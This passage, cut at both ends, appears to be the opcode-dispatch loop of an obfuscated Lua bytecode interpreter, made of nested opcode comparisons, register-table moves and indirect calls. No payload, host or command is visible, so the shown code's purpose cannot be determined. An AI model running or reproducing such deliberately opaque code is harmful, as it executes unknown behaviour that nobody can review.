do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba](r(w,ba+1,y[222]))elseif 31<z then local ba=y[616]w[ba]=w[ba]()else local ba;w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]][y[222]]=y[728];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba](r(w,ba+1,y[222]))end;elseif 33>=z then w[y[616]][w[y[222]]]=w[y[728]];elseif 34<z then local ba;local bb;w[y[616]]={};n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]={r({},1,y[222])};n=n+1;y=f[n];w[y[616]]=w[y[222]];n=n+1;y=f[n];bb=y[616];ba=w[bb];for bc=bb+1,y[222]do t(ba,w[bc])end;else local ba;w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba](r(w,ba+1,y[222]))end;elseif 41>=z then if z<=38 then if z<=36 then local ba;local bb;local bc;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];bc=y[616]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[728]do ba=ba+1;w[bd]=bb[ba];end elseif 37<z then local ba;w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba](r(w,ba+1,y[222]))else do return end;end;elseif 39>=z then local ba;local bb;local bc;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];bc=y[616]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[728]do ba=ba+1;w[bd]=bb[ba];end elseif 40<z then local ba;w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba](r(w,ba+1,y[222]))else w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];if w[y[616]]then n=n+1;else n=y[222];end;end;elseif 44>=z then if(z==42 or z<42)then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 1>ba then bb=nil else w[y[616]]=h[y[222]];end else if 3~=ba then n=n+1;else y=f[n];end end else if ba<=5 then if ba<5 then w[y[616]]=y[222];else n=n+1;end else if ba>6 then w[y[616]]=y[222];else y=f[n];end end end else if ba<=11 then if ba<=9 then if ba==8 then n=n+1;else y=f[n];end else if 10==ba then w[y[616]]=y[222];else n=n+1;end end else if ba<=13 then if ba~=13 then y=f[n];else bb=y[616]end else if 14<ba then break else w[bb]=w[bb](r(w,bb+1,y[222]))end end end end ba=ba+1 end elseif(z<44)then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba<1 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if ba>3 then n=n+1;else w[y[616]]=h[y[222]];end end end else if ba<=6 then if ba>5 then w[y[616]]=h[y[222]];else y=f[n];end else if ba<=7 then n=n+1;else if 9>ba then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end end else if ba<=14 then if ba<=11 then if ba~=11 then n=n+1;else y=f[n];end else if ba<=12 then w[y[616]]=w[y[222]][w[y[728]]];else if 13==ba then n=n+1;else y=f[n];end end end else if ba<=16 then if 16>ba then bd=y[616]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if 19~=ba then for be=bd,y[728]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba>0 then w[y[616]]=w[y[222]][y[728]];else bb=nil end else if ba==2 then n=n+1;else y=f[n];end end else if ba<=5 then if ba~=5 then w[y[616]]=h[y[222]];else n=n+1;end else if ba<=6 then y=f[n];else if 8>ba then w[y[616]]=w[y[222]][y[728]];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if ba==9 then y=f[n];else w[y[616]]=y[222];end else if ba<=11 then n=n+1;else if ba==12 then y=f[n];else w[y[616]]=y[222];end end end else if ba<=15 then if 15~=ba then n=n+1;else y=f[n];end else if ba<=16 then bb=y[616]else if ba~=18 then w[bb]=w[bb](r(w,bb+1,y[222]))else break end end end end end ba=ba+1 end end;elseif 45>=z then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];ba=y[616]w[ba](w[ba+1])elseif z~=47 then local ba=y[616]w[ba](w[ba+1])else local ba;local bb;local bc;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];bc=y[616]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[728]do ba=ba+1;w[bd]=bb[ba];end end;elseif 71>=z then if 59>=z then if 53>=z then if 50>=z then if z<=48 then local ba;local bb,bc;local bd;w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];w[y[616]]=w[y[222]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];bd=y[616]bb,bc=i(w[bd](r(w,bd+1,y[222])))p=bc+bd-1 ba=0;for bc=bd,p do ba=ba+1;w[bc]=bb[ba];end;elseif 50~=z then local ba;local bb;local bc;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];bc=y[616]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[728]do ba=ba+1;w[bd]=bb[ba];end else local ba=y[616]w[ba]=w[ba]()end;elseif 51>=z then local ba;local bb;local bc;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];bc=y[616]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[728]do ba=ba+1;w[bd]=bb[ba];end elseif z>52 then local ba;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba](r(w,ba+1,y[222]))else w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;end;elseif z<=56 then if 54>=z then local ba;local bb;local bc;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];bc=y[616]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[728]do ba=ba+1;w[bd]=bb[ba];end elseif z~=56 then local ba;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba]()else for ba=y[616],y[222],1 do w[ba]=nil;end;end;elseif 57>=z then w[y[616]]=w[y[222]][w[y[728]]];elseif 58==z then w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];if not w[y[616]]then n=n+1;else n=y[222];end;else w[y[616]]();end;elseif 65>=z then if 62>=z then if 60>=z then local ba;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba](w[ba+1])elseif 61==z then w[y[616]]=j[y[222]];else local ba=y[616]w[ba](w[ba+1])end;elseif z<=63 then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];if w[y[616]]then n=n+1;else n=y[222];end;elseif 65>z then local ba=y[616];local bb,bc,bd=w[ba],w[ba+1],w[ba+2];local bb=bb+bd;w[ba]=bb;if bd>0 and bb<=bc or bd<0 and bb>=bc then n=y[222];w[ba+3]=bb;end;else local ba;w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba](r(w,ba+1,y[222]))end;elseif z<=68 then if z<=66 then local ba=y[616]local bb,bc=i(w[ba](w[ba+1]))p=bc+ba-1 local bc=0;for bd=ba,p do bc=bc+1;w[bd]=bb[bc];end;elseif 67==z then w[y[616]]=(not w[y[222]]);else if(w[y[616]]~=y[728])then n=y[222];else n=n+1;end;end;elseif z<=69 then w[y[616]]=y[222];elseif 70<z then w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];n=y[222];else if(w[y[616]]~=w[y[728]])then n=n+1;else n=y[222];end;end;elseif z<=83 then if 77>=z then if z<=74 then if(72>z or 72==z)then if not w[y[616]]then n=(n+1);else n=y[222];end;elseif 74~=z then local ba=y[616]local bb,bc=i(w[ba](r(w,ba+1,y[222])))p=(bc+ba)-1 local bc=0;for bd=ba,p do bc=bc+1;w[bd]=bb[bc];end;else local ba,bb=0 while true do if ba<=11 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if 1<ba then n=n+1;else w[y[616]]=w[y[222]][y[728]];end end else if ba<=3 then y=f[n];else if ba>4 then n=n+1;else w[y[616]]=h[y[222]];end end end else if ba<=8 then if ba<=6 then y=f[n];else if 8~=ba then w[y[616]]=w[y[222]][y[728]];else n=n+1;end end else if ba<=9 then y=f[n];else if 11>ba then w[y[616]]=h[y[222]];else n=n+1;end end end end else if ba<=17 then if ba<=14 then if ba<=12 then y=f[n];else if ba==13 then w[y[616]]=w[y[222]][y[728]];else n=n+1;end end else if ba<=15 then y=f[n];else if 17~=ba then w[y[616]]=h[y[222]];else n=n+1;end end end else if ba<=20 then if ba<=18 then y=f[n];else if ba~=20 then w[y[616]]=w[y[222]][y[728]];else n=n+1;end end else if ba<=22 then if ba~=22 then y=f[n];else bb=y[616]end else if ba~=24 then w[bb]=w[bb](r(w,bb+1,y[222]))else break end end end end end ba=ba+1 end end;elseif(z==75 or z<75)then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba>0 then w[y[616]]=w[y[222]][y[728]];else bb=nil end else if ba~=3 then n=n+1;else y=f[n];end end else if ba<=5 then if ba==4 then w[y[616]]=w[y[222]][y[728]];else n=n+1;end else if ba<=6 then y=f[n];else if ba>7 then n=n+1;else w[y[616]]=w[y[222]][y[728]];end end end end else if ba<=13 then if ba<=10 then if ba==9 then y=f[n];else w[y[616]]=w[y[222]][y[728]];end else if ba<=11 then n=n+1;else if ba~=13 then y=f[n];else w[y[616]]=false;end end end else if ba<=15 then if 15~=ba then n=n+1;else y=f[n];end else if ba<=16 then bb=y[616]else if 18~=ba then w[bb](w[bb+1])else break end end end end end ba=ba+1 end elseif(76<z)then local ba=y[222];local bb=y[728];local ba=k(w,g,ba,bb);w[y[616]]=ba;else local ba,bb=0 while true do if ba<=16 then if ba<=7 then if ba<=3 then if ba<=1 then if ba>0 then w[y[616]]=w[y[222]][y[728]];else bb=nil end else if 3~=ba then n=n+1;else y=f[n];end end else if ba<=5 then if ba~=5 then w[y[616]]=h[y[222]];else n=n+1;end else if 6<ba then w[y[616]]=w[y[222]][y[728]];else y=f[n];end end end else if ba<=11 then if ba<=9 then if ba<9 then n=n+1;else y=f[n];end else if ba~=11 then w[y[616]]={};else n=n+1;end end else if ba<=13 then if 12<ba then w[y[616]]=h[y[222]];else y=f[n];end else if ba<=14 then n=n+1;else if ba<16 then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end end end else if ba<=24 then if ba<=20 then if ba<=18 then if ba<18 then n=n+1;else y=f[n];end else if 19<ba then n=n+1;else w[y[616]]=h[y[222]];end end else if ba<=22 then if 22~=ba then y=f[n];else w[y[616]]={};end else if 23<ba then y=f[n];else n=n+1;end end end else if ba<=28 then if ba<=26 then if ba~=26 then w[y[616]]=h[y[222]];else n=n+1;end else if 27==ba then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end else if ba<=30 then if 30~=ba then n=n+1;else y=f[n];end else if ba<=31 then bb=y[616]else if ba<33 then w[bb]=w[bb]()else break end end end end end end ba=ba+1 end end;elseif(80>=z)then if(78>=z)then local ba,bb=0 while true do if(ba<=29)then if ba<=14 then if(ba<6 or ba==6)then if(ba<2 or ba==2)then if ba<=0 then bb=nil else if not(ba~=1)then w[y[616]]={};else n=(n+1);end end else if(ba==4 or ba<4)then if(4>ba)then y=f[n];else w[y[616]]=y[222];end else if(ba==5)then n=n+1;else y=f[n];end end end else if(ba<10 or ba==10)then if(ba<8 or ba==8)then if ba<8 then w[y[616]][w[y[222]]]=w[y[728]];else n=(n+1);end else if(ba>9)then w[y[616]]=y[222];else y=f[n];end end else if(ba<=12)then if ba>11 then y=f[n];else n=n+1;end else if 14>ba then w[y[616]][w[y[222]]]=w[y[728]];else n=(n+1);end end end end else if(ba<21 or ba==21)then if(ba==17 or ba<17)then if(ba<=15)then y=f[n];else if 17>ba then w[y[616]]=y[222];else n=n+1;end end else if(ba==19 or ba<19)then if(ba~=19)then y=f[n];else w[y[616]][w[y[222]]]=w[y[728]];end else if not(20~=ba)then n=n+1;else y=f[n];end end end else if(ba<25 or ba==25)then if(ba==23 or ba<23)then if(ba<23)then w[y[616]]=y[222];else n=n+1;end else if ba>24 then w[y[616]][w[y[222]]]=w[y[728]];else y=f[n];end end else if ba<=27 then if ba~=27 then n=(n+1);else y=f[n];end else if(ba>28)then n=(n+1);else w[y[616]]=y[222];end end end end end else if ba<=44 then if ba<=36 then if ba<=32 then if(ba==30 or ba<30)then y=f[n];else if(ba<32)then w[y[616]][w[y[222]]]=w[y[728]];else n=n+1;end end else if(ba<34 or ba==34)then if(ba>33)then w[y[616]]=y[222];else y=f[n];end else if(ba<36)then n=n+1;else y=f[n];end end end else if(ba==40 or ba<40)then if(ba<38 or ba==38)then if(38>ba)then w[y[616]][w[y[222]]]=w[y[728]];else n=(n+1);end else if ba>39 then w[y[616]]={};else y=f[n];end end else if(ba<42 or ba==42)then if not(41~=ba)then n=(n+1);else y=f[n];end else if not(ba~=43)then w[y[616]]=y[222];else n=n+1;end end end end else if(ba<=52)then if(ba<=48)then if(ba==46 or ba<46)then if ba==45 then y=f[n];else w[y[616]][w[y[222]]]=w[y[728]];end else if 47<ba then y=f[n];else n=(n+1);end end else if(ba==50 or ba<50)then if ba~=50 then w[y[616]]=j[y[222]];else n=n+1;end else if not(ba~=51)then y=f[n];else w[y[616]]=w[y[222]];end end end else if(ba<56 or ba==56)then if ba<=54 then if ba==53 then n=(n+1);else y=f[n];end else if(56>ba)then w[y[616]]=w[y[222]];else n=n+1;end end else if(ba<58 or ba==58)then if 57==ba then y=f[n];else bb=y[616]end else if ba>59 then break else w[bb](r(w,(bb+1),y[222]))end end end end end end ba=(ba+1)end elseif not(79~=z)then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if 0<ba then w[y[616]]=w[y[222]][y[728]];else bb=nil end else if ba==2 then n=n+1;else y=f[n];end end else if ba<=5 then if ba>4 then n=n+1;else w[y[616]]=h[y[222]];end else if ba<=6 then y=f[n];else if ba==7 then w[y[616]]=w[y[222]][y[728]];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if ba>9 then w[y[616]]=y[222];else y=f[n];end else if ba<=11 then n=n+1;else if 13>ba then y=f[n];else w[y[616]]=y[222];end end end else if ba<=15 then if ba>14 then y=f[n];else n=n+1;end else if ba<=16 then bb=y[616]else if ba~=18 then w[bb]=w[bb](r(w,bb+1,y[222]))else break end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if ba==0 then bb=nil else w[y[616]]=w[y[222]][y[728]];end else if ba<=2 then n=n+1;else if ba~=4 then y=f[n];else w[y[616]]=h[y[222]];end end end else if ba<=7 then if ba<=5 then n=n+1;else if ba>6 then w[y[616]]=h[y[222]];else y=f[n];end end else if ba<=8 then n=n+1;else if ba>9 then w[y[616]]=h[y[222]];else y=f[n];end end end end else if ba<=15 then if ba<=12 then if 12~=ba then n=n+1;else y=f[n];end else if ba<=13 then w[y[616]]=h[y[222]];else if 15~=ba then n=n+1;else y=f[n];end end end else if ba<=18 then if ba<=16 then w[y[616]]=w[y[222]];else if ba==17 then n=n+1;else y=f[n];end end else if ba<=19 then bb=y[616]else if ba~=21 then w[bb](r(w,bb+1,y[222]))else break end end end end end ba=ba+1 end end;elseif(z==81 or z<81)then local ba,bb=0 while true do if ba<=12 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if ba~=2 then w={};else for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;end end else if ba<=3 then n=n+1;else if ba~=5 then y=f[n];else w[y[616]]=false;end end end else if ba<=8 then if ba<=6 then n=n+1;else if ba==7 then y=f[n];else w[y[616]]=j[y[222]];end end else if ba<=10 then if ba<10 then n=n+1;else y=f[n];end else if ba>11 then n=n+1;else for bc=y[616],y[222],1 do w[bc]=nil;end;end end end end else if ba<=18 then if ba<=15 then if ba<=13 then y=f[n];else if ba<15 then w[y[616]]=h[y[222]];else n=n+1;end end else if ba<=16 then y=f[n];else if ba>17 then n=n+1;else w[y[616]]=w[y[222]][y[728]];end end end else if ba<=21 then if ba<=19 then y=f[n];else if ba==20 then w[y[616]]=w[y[222]];else n=n+1;end end else if ba<=23 then if 23~=ba then y=f[n];else bb=y[616]end else if 24==ba then w[bb]=w[bb](w[bb+1])else break end end end end end ba=ba+1 end elseif(z~=83)then local ba=y[616]w[ba]=w[ba](r(w,ba+1,y[222]))else local ba=y[616];do return w[ba],w[ba+1]end end;elseif z<=89 then if 86>=z then if z<=84 then local ba=y[616]local bb={w[ba](w[ba+1])};local bc=0;for bd=ba,y[728]do bc=bc+1;w[bd]=bb[bc];end elseif 86>z then local ba;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba](r(w,ba+1,y[222]))else local ba=y[616];local bb=w[ba];for bc=ba+1,y[222]do t(bb,w[bc])end;end;elseif 87>=z then local ba;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]]*y[728];n=n+1;y=f[n];w[y[616]]=w[y[222]]+w[y[728]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]]+w[y[728]];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba](r(w,ba+1,y[222]))elseif 89>z then local ba=y[616]local bb={}for bc=1,#v do local bd=v[bc]for be=1,#bd do local bd=bd[be]local be,be=bd[1],bd[2]if be>=ba then bb[be]=w[be]bd[1]=bb v[bc]=nil;end end end else local ba;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba](r(w,ba+1,y[222]))end;elseif 92>=z then if 90>=z then local ba;local bb;local bc;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];bc=y[616]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[728]do ba=ba+1;w[bd]=bb[ba];end elseif 92>z then local ba=y[616]local bb={w[ba](r(w,ba+1,p))};local bc=0;for bd=ba,y[728]do bc=bc+1;w[bd]=bb[bc];end else w[y[616]]=h[y[222]];end;elseif z<=93 then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba<1 then bb=nil else w[y[616]]=w[y[222]];end else if 2<ba then y=f[n];else n=n+1;end end else if ba<=5 then if 5~=ba then w[y[616]]=w[y[222]];else n=n+1;end else if ba<7 then y=f[n];else w[y[616]]=w[y[222]];end end end else if ba<=11 then if ba<=9 then if ba==8 then n=n+1;else y=f[n];end else if ba>10 then n=n+1;else w[y[616]]=w[y[222]];end end else if ba<=13 then if 13~=ba then y=f[n];else bb=y[616]end else if 15>ba then w[bb]=w[bb](r(w,bb+1,y[222]))else break end end end end ba=ba+1 end elseif z~=95 then local ba;w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba](r(w,ba+1,y[222]))else local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba](r(w,ba+1,y[222]))end;elseif 143>=z then if(119>z or 119==z)then if(107==z or 107>z)then if(z==101 or z<101)then if 98>=z then if(96>z or 96==z)then if(y[616]<w[y[728]])then n=(n+1);else n=y[222];end;elseif(z>97)then local ba=y[616]w[ba](r(w,(ba+1),y[222]))else local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if 1~=ba then bb=nil else w[y[616]]=w[y[222]][y[728]];end else if 3>ba then n=n+1;else y=f[n];end end else if ba<=5 then if 4<ba then n=n+1;else w[y[616]]=w[y[222]][y[728]];end else if ba<=6 then y=f[n];else if ba==7 then w[y[616]]=w[y[222]][y[728]];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if 10~=ba then y=f[n];else w[y[616]]=w[y[222]][y[728]];end else if ba<=11 then n=n+1;else if 12==ba then y=f[n];else w[y[616]]=false;end end end else if ba<=15 then if ba<15 then n=n+1;else y=f[n];end else if ba<=16 then bb=y[616]else if 17==ba then w[bb](w[bb+1])else break end end end end end ba=ba+1 end end;elseif(z==99 or z<99)then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba>0 then w[y[616]]=h[y[222]];else bb=nil end else if 3>ba then n=n+1;else y=f[n];end end else if ba<=5 then if 4==ba then w[y[616]]=w[y[222]][y[728]];else n=n+1;end else if 7>ba then y=f[n];else w[y[616]]=y[222];end end end else if ba<=11 then if ba<=9 then if 8==ba then n=n+1;else y=f[n];end else if ba~=11 then w[y[616]]=y[222];else n=n+1;end end else if ba<=13 then if ba==12 then y=f[n];else bb=y[616]end else if ba==14 then w[bb]=w[bb](r(w,bb+1,y[222]))else break end end end end ba=ba+1 end elseif not(z~=100)then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if 1~=ba then bb=nil else w[y[616]]=w[y[222]][w[y[728]]];end else if 3~=ba then n=n+1;else y=f[n];end end else if ba<=5 then if 4==ba then w[y[616]]=w[y[222]];else n=n+1;end else if ba<=6 then y=f[n];else if 8>ba then w[y[616]]=y[222];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if 10~=ba then y=f[n];else w[y[616]]=y[222];end else if ba<=11 then n=n+1;else if ba~=13 then y=f[n];else w[y[616]]=y[222];end end end else if ba<=15 then if 14<ba then y=f[n];else n=n+1;end else if ba<=16 then bb=y[616]else if 18>ba then w[bb]=w[bb](r(w,bb+1,y[222]))else break end end end end end ba=ba+1 end else local ba=y[616]w[ba](r(w,ba+1,p))end;elseif z<=104 then if z<=102 then local ba,bb=0 while true do if(ba<8 or ba==8)then if(ba<3 or ba==3)then if(ba<1 or ba==1)then if(1~=ba)then bb=nil else w[y[616]]=j[y[222]];end else if ba>2 then y=f[n];else n=n+1;end end else if ba<=5 then if 5>ba then w[y[616]]=w[y[222]][y[728]];else n=n+1;end else if(ba<6 or ba==6)then y=f[n];else if(7<ba)then n=(n+1);else w[y[616]]=y[222];end end end end else if(ba<13 or ba==13)then if(ba<=10)then if(9<ba)then w[y[616]]=y[222];else y=f[n];end else if(ba<11 or ba==11)then n=(n+1);else if not(ba~=12)then y=f[n];else w[y[616]]=y[222];end end end else if ba<=15 then if ba>14 then y=f[n];else n=n+1;end else if(ba<16 or ba==16)then bb=y[616]else if(ba<18)then w[bb]=w[bb](r(w,bb+1,y[222]))else break end end end end end ba=(ba+1)end elseif 104~=z then local ba=0 while true do if ba<=6 then if ba<=2 then if ba<=0 then w[y[616]]=w[y[222]][y[728]];else if ba>1 then y=f[n];else 